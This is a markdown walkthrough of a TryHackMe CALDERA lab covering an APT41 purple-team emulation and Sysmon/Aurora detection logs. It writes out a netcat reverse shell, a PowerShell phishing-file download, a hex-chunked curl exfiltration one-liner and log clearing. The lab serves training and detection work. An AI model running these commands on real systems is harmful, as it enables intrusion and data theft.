Get-NetTCPConnection -RemotePort "7012" -EA silentlycontinue | where-object { write-host $_.OwningProcess }

# Execution N.4
Get-NetTCPConnection -RemotePort "4444" -EA silentlycontinue | where-object { write-host $_.OwningProcess }

```

### Incident Response Scenario

Simulate a simple Incident Response scenario to trigger some of the abilities included in the **Incident Responder** profile. 

**First**: Establish a reverse shell from our victim machine to our AttackBox instance.

Attack Machine

```bash
nc -lvp 4444 -s $(hostname -I | awk '{print $1}')
```

Victim Machine

```powershell
PS C:\Tools> .\nc.exe 10.10.39.5 4444 -e cmd.exe
```

<img width="1591" height="530" alt="image" src="https://github.com/user-attachments/assets/f9c7ef33-d416-4881-b800-8fc3c07e05e7" />

Now, let's execute the response operation and observe the behaviour 

### Running Blue operation

**Second**: deploy a new blue agent

<img width="1062" height="491" alt="image" src="https://github.com/user-attachments/assets/7c3ee502-02b5-4616-9740-88206b121734" />

Choose the blue-team agent reverse shell

<img width="1071" height="510" alt="image" src="https://github.com/user-attachments/assets/76cdcefe-3f79-4a5a-9677-895a04b5bfe7" />

Execute it on the victim machine.

<img width="996" height="293" alt="image" src="https://github.com/user-attachments/assets/8b8ff126-e950-4161-9919-61174369fe71" />

The Agent is now active

<img width="1401" height="453" alt="image" src="https://github.com/user-attachments/assets/c9057bce-90a3-4dab-935c-2640576353de" />

**Third**: Create a new blue operation

<img width="728" height="690" alt="image" src="https://github.com/user-attachments/assets/37f48fd1-02f7-42ac-954e-85c508813303" />

Start the operation.

<img width="1744" height="799" alt="image" src="https://github.com/user-attachments/assets/5ea666b3-2a27-4e94-a3e1-eb2d1c59adb7" />

The output of `Find unauthorized processes` ****ability

<img width="1111" height="220" alt="image" src="https://github.com/user-attachments/assets/17f3f504-a780-4a04-96a9-3a9975f2a6a3" />

<img width="1108" height="596" alt="image" src="https://github.com/user-attachments/assets/43afb145-7994-440e-8e34-b5ae78fb120c" />

the output of `Enable Outbound TCP/UDP firewall rule` ability

<img width="1233" height="262" alt="image" src="https://github.com/user-attachments/assets/243cbbe3-d076-4520-b6ee-ca74578120b4" />

```powershell

New-NetFirewallRule -DisplayName "Block out-bound UDP traffic to port 4444 from PID 4572" -Group "Caldira" -Direction Outbound -Protocol UDP -Action Block -RemotePort 4444;New-NetFirewallRule -DisplayName "Block out-bound TCP traffic to port 4444 from PID 4572" -Group "Caldira" -Direction Outbound -Protocol TCP -Action Block -RemotePort 4444;

```

<img width="1110" height="640" alt="image" src="https://github.com/user-attachments/assets/724243a5-0dcb-44a5-9719-37843ffc7d84" />

The output of `Kill rogue process` response ability

<img width="1209" height="273" alt="image" src="https://github.com/user-attachments/assets/9ac16814-fb63-4504-b6c5-1125d9478d67" />

<img width="1651" height="325" alt="image" src="https://github.com/user-attachments/assets/faa00ed0-9ed9-4c59-8747-1ead86907cc4" />

The malicious process has been successfully killed. 

# Case Study: Emulating APT41

## Purple Team Exercise: Emulation of APT41

In this scenario, you are tasked to emulate the known TTPs of APT41 in your organization's infrastructure to test your security defences against threat actors known to target similar sectors, such as Healthcare, Telecommunications, and Technology.

| **Tactic** | **Technique** | Ability Name |
| --- | --- | --- |
| Initial Access | Spearphishing Attachment (T1566.001) | Download Macro-Enabled Phishing Attachment |
| Execution | Windows Management Instrumentation (T1047) | Create a Process using obfuscated Win32_Process |
| Execution | Service Execution (T1569.002) | Execute a Command as a Service |
| Persistence | Scheduled Task/Job: Scheduled Task (T1053.005) | Powershell Cmdlet Scheduled Task |
| Persistence | Local Account (T1136.001) | Create a new user in a command prompt |
| Defense Evasion | Clear Windows Event Logs (T1070.001) | Clear Logs (using wevtutil) |
| Discovery | File and Directory Discovery (T1083) | File and Directory Discovery (PowerShell) |
| Collection | Data from Local System (T1005) | Find files |

You need to use the red account again to execute the TTPs. In addition, ensure that your HTTP listener (on port 8080) on AttackBox is still running.

**Operation Guidelines**

You may follow these guidelines, which is a summary of the methodology covered from the previous tasks:

- Create a new threat profile and select all TTPs mentioned above.
- Establish a connection to the target machine via an agent.
- Start emulating the threat profile and observe the execution of each technique.
- Document and review the results.

## Agent Configuration

Login to Red account and create a new agent

<img width="1108" height="628" alt="image" src="https://github.com/user-attachments/assets/d38984c1-90b8-46dc-9e42-80be72292996" />

Copy the reverse shell

<img width="1063" height="506" alt="image" src="https://github.com/user-attachments/assets/e792d2dc-0b03-42f1-bbbc-9b29d355b513" />

Paste it to the victim machine

<img width="985" height="255" alt="image" src="https://github.com/user-attachments/assets/2b3da424-c3cd-484f-ae60-2a4c40d0b356" />

<img width="1144" height="77" alt="image" src="https://github.com/user-attachments/assets/f3d668ca-c56b-4cc3-b2cf-2df61a5501ed" />

Create a threat profile and add the listed abilities mentioned above; make sure the abilities are configured correctly.

<img width="1149" height="593" alt="image" src="https://github.com/user-attachments/assets/3525dfba-8064-412f-a7a8-125f1f186c9e" />

<img width="1656" height="721" alt="image" src="https://github.com/user-attachments/assets/73d70cb9-aefb-4103-856c-8a149f060fcc" />

Create and start a new operation, but before that, make sure the Sysmon log and Application log are cleared

<img width="863" height="673" alt="image" src="https://github.com/user-attachments/assets/91b4815c-56ee-43fa-9fa0-bbccbb66a4ec" />

<img width="881" height="262" alt="image" src="https://github.com/user-attachments/assets/1caf0849-6618-46a9-8e40-22961896f2b7" />

### Initial Access: Download Macro-Enabled Phishing Attachment

<img width="970" height="738" alt="image" src="https://github.com/user-attachments/assets/0925a67f-4b22-4a1e-8074-c03929923ae5" />

<img width="818" height="333" alt="image" src="https://github.com/user-attachments/assets/c3235888-12cf-4cce-82a1-44ff9f74a5c3" />

**Aurora Rule Matched:**

```
Sigma rule match found: Suspicious Invoke-WebRequest Execution With DirectIP 
Sigma rule match found: PowerShell Web Download
Sigma rule match found: Change PowerShell Policies to an Insecure Level 
Sigma rule match found: Usage Of Web Request Commands And Cmdlets
```

### Execution: Create a Process using obfuscated Win32_Process

<img width="1135" height="446" alt="image" src="https://github.com/user-attachments/assets/d6174ef8-f770-463a-8a69-649cd8e638a6" />

**Sysmon log**

<img width="889" height="660" alt="image" src="https://github.com/user-attachments/assets/ed875df1-e177-4fa6-81dc-9a2323adca2e" />

**Spawned Process:**

<img width="869" height="673" alt="image" src="https://github.com/user-attachments/assets/a73d7d65-554e-4bc3-ac34-0de44c71a57d" />

<img width="798" height="100" alt="image" src="https://github.com/user-attachments/assets/913fb670-6538-4a81-8943-f7aff5fd502b" />

**Aurora Matched Rules**

```powershell
Sigma rule match found: WmiPrvSE Spawned A Process
		Match_Strings: \WmiPrvSE.exe in ParentImage
```

### Execution: Execute a Command as a Service

<img width="1086" height="370" alt="image" src="https://github.com/user-attachments/assets/e16f2708-888a-417e-939e-6a28f0e549ff" />

Sysmon log

<img width="834" height="652" alt="image" src="https://github.com/user-attachments/assets/786acbd7-9ec1-4093-afde-6e69bff7eeea" />

**Aurora Matched Rule**

```
Sigma rule match found: Change PowerShell Policies to an Insecure Level
		Match_Strings: '-ExecutionPolicy ' in CommandLine, Bypass in CommandLine, \powershell.exe in Image, PowerShell.EXE in OriginalFileName
```

### Persistence: PowerShell Cmdlet Scheduled Task

<img width="1103" height="510" alt="image" src="https://github.com/user-attachments/assets/cafdf6cd-a10b-482f-aad5-c0a387f914f8" />

**Sysmon Log:**

<img width="852" height="663" alt="image" src="https://github.com/user-attachments/assets/9b0b6e0b-d78b-48fd-b060-93dbbd456d0c" />

**Aurora Rule Matched:**

```
Sigma rule match found: Powershell Create Scheduled Task 
		Match_Strings: register-ScheduledTask in ScriptBlockText, register-ScheduledTask in ScriptBlockText

```

```powershell
PS C:\Tools> Get-ScheduledTask -TaskName "AtomicTask" |fl *

State                 : Ready
Actions               : {MSFT_TaskExecAction}
Author                :
Date                  :
Description           :
Documentation         :
Principal             : MSFT_TaskPrincipal2
SecurityDescriptor    :
Settings              : MSFT_TaskSettings3
Source                :
TaskName              : AtomicTask
TaskPath              : \
Triggers              : {MSFT_TaskLogonTrigger}
URI                   : \AtomicTask
Version               :
PSComputerName        :
CimClass              : Root/Microsoft/Windows/TaskScheduler:MSFT_ScheduledTask
CimInstanceProperties : {Actions, Author, Date, Description...}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties

```

### Persistence: Create a new user in a command prompt

<img width="1091" height="589" alt="image" src="https://github.com/user-attachments/assets/82238416-bbfd-4e43-9367-faa3b1dc5cb2" />

Sysmon log

<img width="878" height="676" alt="image" src="https://github.com/user-attachments/assets/ad6e954f-93cb-405d-9bcf-bfd908f03e54" />

<img width="792" height="468" alt="image" src="https://github.com/user-attachments/assets/ea6aee12-7a58-465c-a700-4bc95bf50fe9" />

**Aurora Rule Matched**

```
Sigma rule match found: New User Created Via Net.EXE 
		Match_Strings: user in CommandLine, add in CommandLine, \net.exe in Image, net.exe in OriginalFileName
```

### Defence Evasion: Clear Log

<img width="1164" height="702" alt="image" src="https://github.com/user-attachments/assets/9b4c685b-8b64-44b6-ba10-57ba23706ea9" />

**Sysmon log**

<img width="864" height="685" alt="image" src="https://github.com/user-attachments/assets/6e3361ab-6797-470c-ae2d-652555541cf1" />

**Aurora Rule Matched:**

```
Sigma rule match found: Suspicious Eventlog Clearing or Configuration Change Activity
		Match_Strings: ' cl ' in CommandLine, \wevtutil.exe in Image 

```

### Discovery: File and Directory Discovery (PowerShell)

<img width="1081" height="397" alt="image" src="https://github.com/user-attachments/assets/3a3a41ef-dcf3-49d2-85b8-be2bfbff3cc7" />

<img width="838" height="610" alt="image" src="https://github.com/user-attachments/assets/f36aaa7f-22d8-432e-a4a8-c10c2134cc3b" />

**Aurora Rule Matched**

```
Sigma rule match found: Change PowerShell Policies to an Insecure Level 
		Match_Strings: '-ExecutionPolicy ' in CommandLine, Bypass in CommandLine, \powershell.exe in Image, PowerShell.EXE in OriginalFileName
```

### Collection: Find Files

For the last ability, click on **Run** to run the rest of the operation instead of **Run 1 Link**, because the last ability needs to run multiple times, and if you click on **Run 1 Link**, it will repeat the process.

Room URL: https://tryhackme.com/room/caldera

**Learning Objectives:**

- Breakdown of CALDERA's core terminologies and functionalities.
- Application of planning and grouping of adversarial use cases.
- Automation of Incident Response via CALDERA.
- Implications of threat emulation to detection engineering.

## **CALDERA** Overview

**CALDERA** is an open-source framework built by **MITRE** for running **autonomous adversary emulation** exercises. It is based on the **MITRE ATT&CK®** framework and is used to test security defenses by simulating real-world attacks.

**Primary Use Cases:**

1. **Autonomous Red Team Engagements:** Automatically emulating known adversary profiles to identify security gaps.
2. **Manual Red Team Engagements:** Providing a customizable platform for red teams to execute custom TTPs.
3. **Autonomous Incident Response:** Enabling blue teams to perform automated detection and response actions.

**Core Terminologies:**

- **Agents:** Implants (e.g., Sandcat, Manx) deployed on target systems that communicate with the CALDERA server to receive and execute commands.
- **Abilities:** Implementations of specific ATT&CK techniques (commands, payloads) that agents run.
- **Adversaries:** Groups of abilities bundled together to mimic the TTPs of a known threat actor.
- **Operations:** The process of running an adversary profile's abilities on a selected group of agents.
- **Plugins:** Modules that extend CALDERA's core functionality (e.g., Sandcat agent, Training, Response).

**Key Operation Concepts:**

- **Planners:** Determine the order of ability execution (e.g., Atomic, Batch).
- **Facts:** Pieces of information about a target system that some abilities require to run.
- **Obfuscators:** Used to hide commands from detection before execution.
- **Jitter:** Controls how often agents check in with the server.

In essence, CALDERA is a versatile tool that allows security teams to automate the emulation of cyber attacks (red teaming) and the response to them (blue teaming) within a single, ATT&CK-based platform.

## Running Operations with CALDERA

To start with, let's follow this guide to emulate a single adversary profile successfully:

1. Run the CALDERA instance.
2. Deploy an agent in the target machine.
3. Choose the adversary profile and review the abilities to be executed.
4. Run the operation.
5. Review the results.

﻿
**Connecting to the CALDERA Instance** 

<img width="1100" height="540" alt="image" src="https://github.com/user-attachments/assets/a175da40-0621-4afb-85b9-c0ed76966d95" />

**Prerequisites:**

- Two machines: one running the **CALDERA server** (on the AttackBox) and a **Windows victim machine**.
- CALDERA web access credentials: Username **`red`**, Password **`admin`**.

**First# Start CALDERA Server:** On the AttackBox, navigate to the CALDERA directory, activate its Python virtual environment, and start the server with **`python server.py --insecure`**. Wait for the "All systems ready" message.

```powershell
root@ip-10-10-1-65:~/Rooms/caldera/caldera# source ../caldera_venv/bin/activate
(caldera_venv) root@ip-10-10-1-65:~/Rooms/caldera/caldera# python server.py --insecure

```


**Second# Deploy an Agent:** An agent (implant) must be deployed on the victim machine to receive commands from CALDERA.

- In the CALDERA web UI, go to the 'Agents' tab and deploy a **`Manx`** (TCP reverse shell) agent for Windows.
- Configure the agent: Set the IP address to the AttackBox's IP and give the implant a deceptive name (e.g., **`chrome.exe`**).
- Copy the generated PowerShell command from CALDERA and execute it on the victim machine. This downloads and runs the agent.


<img width="1400" height="572" alt="image" src="https://github.com/user-attachments/assets/d07f013f-4522-47d9-a4a2-4ae7ff440441" />

<img width="1878" height="820" alt="image" src="https://github.com/user-attachments/assets/1d59f353-e68e-485f-a471-12cee306df79" />

<img width="1137" height="616" alt="image" src="https://github.com/user-attachments/assets/4b1cb6a9-6b94-4944-b557-0789f0e0dff6" />

Copy the reverse shell agent and paste it into the victim server

<img width="1809" height="884" alt="image" src="https://github.com/user-attachments/assets/4d78ffad-f66d-4bc5-9610-e930b1be3bbc" />

<img width="1734" height="853" alt="image" src="https://github.com/user-attachments/assets/dfe5ae24-5734-45bf-ae5f-1a4f44a5291a" />

**Third#** **Select an Adversary Profile:** Choose a profile defining the attack techniques to emulate. The example uses the **"Enumerator"** profile, which contains five abilities for system enumeration.

- It is crucial to **review the abilities** beforehand to understand the commands that will be executed on the victim (e.g., **`WMIC Process Enumeration`**).

<img width="1430" height="826" alt="image" src="https://github.com/user-attachments/assets/e15bcfba-855d-4c07-b852-794881d4fa7f" />

<img width="1610" height="530" alt="image" src="https://github.com/user-attachments/assets/9d607331-2cd9-4468-8c37-860bb91e3a10" />

 Click on the abilities to see the execution details.

<img width="1177" height="734" alt="image" src="https://github.com/user-attachments/assets/203f14fc-8549-4b62-ab07-3e687ea6ed85" />

**Four# Execute the Operation:** Run the emulation by creating a new operation.

- Go to the 'Operations' tab and click 'Create Operation'.
- Key configuration:
    - **Adversary Profile:** Select the chosen profile (e.g., **`Enumerator`**).
    - **Group:** Set to **`red`** to target only the red team agents.
    - **Obfuscation:** Can be disabled for simplicity in this test.
- Start the operation. CALDERA will task the agent to execute the abilities in the profile sequentially.

<img width="1546" height="693" alt="image" src="https://github.com/user-attachments/assets/b13a0ac6-e7f1-44b5-88e1-3d5ae6e776a9" />

<img width="1896" height="750" alt="image" src="https://github.com/user-attachments/assets/fd750310-5e4a-40c8-88f4-837572460ae1" />

**Five# Review the Results:** After the operation completes, review the results in the operation view.

- For each ability, you can click **"View Command"** to see what was run and **"View Output"** to see the results (stdout/stderr) from the victim machine.
- Note: Some abilities might fail; the operation can be rerun or continued as needed.

<img width="1125" height="292" alt="image" src="https://github.com/user-attachments/assets/a492d328-03e1-4018-a6ee-ea664b849a44" />

<img width="1156" height="702" alt="image" src="https://github.com/user-attachments/assets/c98d58e1-5c74-4739-87e0-8934882479c1" />

Some commands may not return output, such as this command for SysInternals PSTool Process Discovery

<img width="1422" height="317" alt="image" src="https://github.com/user-attachments/assets/1a37ea0d-e122-4b9e-bcec-145ca1017f96" />

<img width="1301" height="402" alt="image" src="https://github.com/user-attachments/assets/77b52549-042f-49aa-8a53-0e3f89d6e334" />

## In-Through-Out

We executed a single adversary profile and its underlying abilities from the previous task. Now, we will attempt to customise the framework and emulate an attack chain that traverses from Initial Access to Achieving the Objective.

For this scenario, we will emulate the following techniques:

| **Tactic** | **Technique** | **Ability Name** |
| --- | --- | --- |
| **Initial Access** | Spearphishing Attachment (T1566.001) | Download Macro-Enabled Phishing Attachment |
| **Execution** | Windows Management Instrumentation (T1047) | Create a Process using WMI Query and an Encoded Command |
| **Persistence** | Boot or Logon Autostart Execution: Winlogon Helper DLL (T1547.004) | Winlogon HKLM Shell Key Persistence - PowerShell |
| **Discovery** | Account Discovery: Local Account (T1087.001) | Identify local users |
| **Collection** | Data Staged: Local Data Staging (T1074.001) | Zip a Folder with PowerShell for Staging in Temp |
| **Exfiltration** | Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (T1048.003) | Exfiltrating Hex-Encoded Data Chunks over HTTP |

### **Modifying Existing Abilities**

Since the victim machine dose not have an internet connection, we mush host the malicious file on our attacking machine for the victim to download. 

View the ability `Download Macro-Enabled Phishing Attachment` 

<img width="1412" height="680" alt="image" src="https://github.com/user-attachments/assets/275bc6ea-0ad8-4017-b953-5d1e277f5c85" />

<img width="1131" height="726" alt="image" src="https://github.com/user-attachments/assets/aac710dc-bcbf-44fb-bae4-3be8093ea964" />

And change the URL to our attack IP machine and the listening port. Then save the ability

```powershell
$url = 'http://10.10.118.21:8080/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
```

<img width="1203" height="636" alt="image" src="https://github.com/user-attachments/assets/199231c8-1428-4c29-a8a4-1403f30d3d82" />

The second ability to customise is  `Zip a Folder with PowerShell for Staging in Temp`

<img width="791" height="292" alt="image" src="https://github.com/user-attachments/assets/67528e6a-b0ce-421f-b964-549dfc228900" />

change the commands to this:

```powershell
# Attack Command
Compress-Archive -Path $env:USERPROFILE\Downloads -DestinationPath $env:TEMP\exfil.zip -Force

# Cheanup command
Remove-Item -Path $env:TEMP\exfil.zip -ErrorAction Ignore

```

<img width="1081" height="459" alt="image" src="https://github.com/user-attachments/assets/75c580df-4140-4eb5-9a3b-38dc9cc82d09" />

### Creating a Custom Ability

the ability `Exfiltrating Hex-Encoded Data Chunks over HTTP` does not exist, so we must create a new ability to complete the emulation activity. The goal is to execute a command that exfiltrates the collected data from the `Zip a Folder with PowerShell for Staging in Temp` ability.

To do this, we will use the following PowerShell commands to hex-encode the data, split it into chunks, and send it to the existing HTTP listener (running on port 8080) from the AttackBox instance. 

```powershell
$file="$env:TEMP\exfil.zip"; $destination="http://10.10.118.21:8080/"; $bytes=[System.IO.File]::ReadAllBytes($file); $hex=($bytes|ForEach-Object ToString X2) -join ''; $split=$hex -split '(\S{20})' -ne ''; ForEach ($line in $split) { curl.exe "$destination$line" } echo "Done exfiltrating the data. Check your listener."

```

<img width="1114" height="640" alt="image" src="https://github.com/user-attachments/assets/d595ffe1-3fcd-47ed-96db-b988abd8b0b5" />

<img width="1174" height="638" alt="image" src="https://github.com/user-attachments/assets/d2909ba7-18ec-4807-a964-97c98b184c41" />

Once done, save it.

<img width="973" height="475" alt="image" src="https://github.com/user-attachments/assets/43c82bd0-05da-4677-afcb-7aeee12aebcb" />

### **Creating a Custom Adversary Profile**

Now that all abilities are prepered, create a new adversary profile by clicking on the **adversaries** tab > click **New Profile,** then fill the required fields

<img width="1418" height="718" alt="image" src="https://github.com/user-attachments/assets/4b20264c-4aa4-47ff-aaa2-e5726464b4b8" />

After creating, add Abilities by clicking on **Add Ability** option, then add all the above-mentioned abilities

<img width="1899" height="856" alt="image" src="https://github.com/user-attachments/assets/7f02e31b-635e-4fbf-a487-dca5c74f5a74" />

### **Running the Operation and Reviewing Results**

First, create a new operation by clicking on the **operation** tab, then configure the operation like this:

<img width="1207" height="795" alt="image" src="https://github.com/user-attachments/assets/9727f808-438b-41bd-a056-9265792b1734" />

Before starting the operation, start the Python server to host the malicious file.

<img width="1721" height="820" alt="image" src="https://github.com/user-attachments/assets/a8e66988-9cc2-4145-b0a3-5a7847849f1c" />

**Initial Access**: Download Macro-Enabled Phishing Attachment

<img width="1335" height="366" alt="image" src="https://github.com/user-attachments/assets/b4b4c523-e6e8-4727-82f7-bd0fc66b4aea" />

**Execution**: Create a Process using WMI Query and an Encoded Command

<img width="1202" height="292" alt="image" src="https://github.com/user-attachments/assets/718dbf92-2d5f-439e-918e-38c479a993c9" />

Decoded command:

```powershell
Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exeਊ
```

<img width="1188" height="588" alt="image" src="https://github.com/user-attachments/assets/0f1eeb04-8693-4a11-80d5-5f1a036b175b" />

**Persistence**: Winlogon HKLM Shell Key Persistence - PowerShell

<img width="1262" height="329" alt="image" src="https://github.com/user-attachments/assets/c73e463c-1ac0-4357-a980-20a9741625aa" />

**Discovery**: Identify local users

<img width="1289" height="307" alt="image" src="https://github.com/user-attachments/assets/746f9132-4055-4afa-8684-aed4d479353b" />

<img width="1174" height="613" alt="image" src="https://github.com/user-attachments/assets/8074321c-4c9c-4bf6-b3fd-b6420f5accf9" />

Four accounts were identified: (Administrator, DefaultAccount, Guest, WDAGUtilityAccount)

**Collection**: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (T1048.003)

<img width="1119" height="273" alt="image" src="https://github.com/user-attachments/assets/cb9ccc84-48ea-422f-8942-8bea60645320" />

**Efiltration**: For the last ability, it didn't run till I modified it from the **adversary profile** and changed the executor to **psh** 

<img width="570" height="312" alt="image" src="https://github.com/user-attachments/assets/a5edc8f0-8af2-4409-add7-df84809221db" />

```powershell

$file="$env:TEMP\exfil.zip"; $destination="http://10.10.1.65:8080/"; $bytes=[System.IO.File]::ReadAllBytes($file); $hex=($bytes|ForEach-Object ToString X2) -join ''; $split=$hex -split '(\S{20})' -ne ''; ForEach ($line in $split) { curl.exe "$destination$line" } echo "Done exfiltrating the data. Check your listener."
```

<img width="1307" height="340" alt="image" src="https://github.com/user-attachments/assets/4057d626-dcf7-49ae-a27a-59bf4a7d7941" />

<img width="1177" height="505" alt="image" src="https://github.com/user-attachments/assets/b8aa00e1-139a-4877-bcb1-fe0072fd7765" />

<img width="1652" height="734" alt="image" src="https://github.com/user-attachments/assets/5b55b145-17ed-471f-84b0-8aa5776e8572" />

There were 23 HTTP GET requests. If you want to decode the hex, combine all the hex values and save them to a file 

```powershell
504B03041400000008002E9B7D56A1A236FD430000005A0000001C000000446F776E6C6F6164735C73656E7369746976655F646174612E747874FBFFCF99219F218F219DA1882191A184A19421074C6782458B191419141842183280FC62200B4226027131432A583E13ACB60CC853604801EB4C64D063E065E0620000504B010214001400000008002E9B7D56A1A236FD430000005A0000001C0000000000000000000000000000000000446F776E6C6F6164735C73656E7369746976655F646174612E747874504B050600000000010001004A0000007D00000000    
```

Then decode it as a zip file

```powershell
root@ip-10-10-1-65:~/Rooms/caldera/http_server# ls
exfilterat.txt  ex.zip  PhishingAttachment.xlsm
root@ip-10-10-1-65:~/Rooms/caldera/http_server# ls
'Downloads\sensitive_data.txt'   exfilterat.txt   ex.zip   PhishingAttachment.xlsm
root@ip-10-10-1-65:~/Rooms/caldera/http_server# cat 'Downloads\sensitive_data.txt' 
\ufffd\ufffdCongratulations! This is a sensitive data.

```

## Emulation on Detection

Review the events generated by executing the emulation activity of the previous task. The logs provided are:

- Sysmon
- AuroraEDR

Rerun the operation and wait till it finishes, then review the logs. If you prefer to run abilities individually and review their logs. Create a new operation and check **Pause on Start.** Then run the operation by clicking on **Run 1 Link, w**hich will run one ability and pause when it finishes

<img width="1122" height="643" alt="image" src="https://github.com/user-attachments/assets/cf1ead66-4656-4da3-aeec-2b52575fe762" />

If Aurora logs are not showing, check the expiration time; if it has expired, change the machine time. Then restart it from **services.msc**

<img width="944" height="692" alt="image" src="https://github.com/user-attachments/assets/0b87f3e6-8d90-47f2-87e8-5115a4db3d08" />

Machine time after I change it.

<img width="560" height="399" alt="image" src="https://github.com/user-attachments/assets/84d3f243-594f-4c16-a74c-4e533e0299d6" />

Check List of [EventID-AuroraAgent](https://aurora-agent-manual.nextron-systems.com/en/latest/usage/event-id-list.html)

### Initial Access: Download Macro-Enabled Phishing Attachment

EventID: 1

```
 RuleName - 
  UtcTime 2025-03-31 10:51:46.187 
  ProcessId 1012 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  Company Microsoft Corporation 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "$url = 'http://10.10.39.5:8080/PhishingAttachment.xlsm'; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm" 
  ParentProcessId 5464 

```

File Create EventID 11

```
UtcTime 2025-03-31 10:51:46.493 
  ProcessGuid {c5d2b969-73c2-67ea-4501-000000002901} 
  ProcessId 1012 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  TargetFilename C:\Users\Administrator\AppData\Local\Temp\2\PhishingAttachment.xlsm 
  CreationUtcTime 2025-08-08 09:14:32.351 
```

Network Connection Detection: EventID 3

```
 RuleName Proxy 
  UtcTime 2025-08-24 10:52:24.435 
  ProcessId 1012 
  Image <unknown process> 
  User - 
  Protocol tcp 
  Initiated true 
  SourceIsIpv6 false 
  SourceIp 10.10.4.48 
  SourceHostname VICTIM.eu-west-1.compute.internal 
  SourcePort 49974 
  SourcePortName - 
  DestinationIsIpv6 false 
  DestinationIp 10.10.39.5 
  DestinationHostname ip-10-10-39-5.eu-west-1.compute.internal 
  DestinationPort 8080 
  DestinationPortName - 

```

**Aurora Agent**: You may use this search filter, but it has an indexing issue, that is because the order and number of **`<Data>`** elements can vary between different events.

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName "Application" -FilterXPath "*[System[Provider[@Name='AuroraAgent'] and (EventID=1301)]]" |
>>     Sort-Object TimeCreated |
>>     ForEach-Object {
>>         [PSCustomObject]@{
>>             TimeCreated = $_.TimeCreated
>>             EventId = $_.Id
>>             Computer = $_.MachineName
>>             # Accessing the EventData by its index in the Properties array
>>             Alert = $_.Properties[0].Value  # "Filename IOC match found"
>>             Module = $_.Properties[1].Value # "Module: ApplyIOCs"
>>             ApplicationId = $_.Properties[2].Value # "ApplicationId:"
>>             CommandLine = $_.Properties[3].Value # The malicious command line
>>             TargetComputer = $_.Properties[4].Value # "Computer: VICTIM"
>>             # ... and so on for any other data points you need ...
>>             SuspiciousFile = $_.Properties[12].Value # "ImageFileName: splunkd.exe"
>>             ProcessId = $_.Properties[21].Value # "ProcessId: 5464"
>>             User = $_.Properties[30].Value # "User: VICTIM\Administrator"
>>             # The full message is also available
>>             FullMessage = $_.Message
>>         }
>>     }

```

Rule Matched:

```
1. Sigma rule match found: Suspicious Invoke-WebRequest Execution With DirectIP 
2. Sigma rule match found: PowerShell Web Download
3. Sigma rule match found: Change PowerShell Policies to an Insecure Level 
4. Sigma rule match found: Usage Of Web Request Commands And Cmdlets
```

### Execution: Create a Process using WMI Query and an Encoded Command

Sysmon Log. Event ID 1

```
UtcTime 2025-03-31 10:52:07.290 
  ProcessGuid {c5d2b969-73d7-67ea-4601-000000002901} 
  ProcessId 3492 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  Company Microsoft Corporation 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA" 
  ParentProcessId 5464 

```

Decoded base64

```powershell
Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
```

```
 EventData 
  RuleName - 
  UtcTime 2025-03-31 10:52:07.500 
  ProcessGuid {c5d2b969-73d7-67ea-4701-000000002901} 
  ProcessId 768 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  FileVersion 10.0.17763.1 (WinBuild.160101.0800) 
  Description Windows PowerShell 
  Product Microsoft® Windows® Operating System 
  Company Microsoft Corporation 
  OriginalFileName PowerShell.EXE 
  CommandLine "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA 
  ParentProcessId 3492 
  ParentImage C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  ParentCommandLine powershell.exe -ExecutionPolicy Bypass -C "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA" 
  ParentUser VICTIM\Administrator 

```

Target process

```
 RuleName - 
  UtcTime 2025-03-31 10:52:07.798 
  ProcessGuid {c5d2b969-73d7-67ea-4801-000000002901} 
  ProcessId 936 
  Image C:\Windows\System32\notepad.exe 
  FileVersion 10.0.17763.1697 (WinBuild.160101.0800) 
  Description Notepad 
  OriginalFileName NOTEPAD.EXE 
  CommandLine notepad.exe 
  ParentProcessId 4928 
  ParentImage C:\Windows\System32\wbem\WmiPrvSE.exe 
  ParentCommandLine C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding 
  ParentUser NT AUTHORITY\NETWORK SERVICE 

```

**Aurora Agent: Rule matched**

```
1. Sigma rule match found: Suspicious Execution of Powershell with Base64
2. Sigma rule match found: PowerShell Base64 Encoded Invoke Keyword  
```

### Persistence: Winlogon HKLM Shell Key Persistence - PowerShell

**Sysmon. EventID 1**

```
 RuleName - 
  UtcTime 2025-03-31 10:52:28.393 
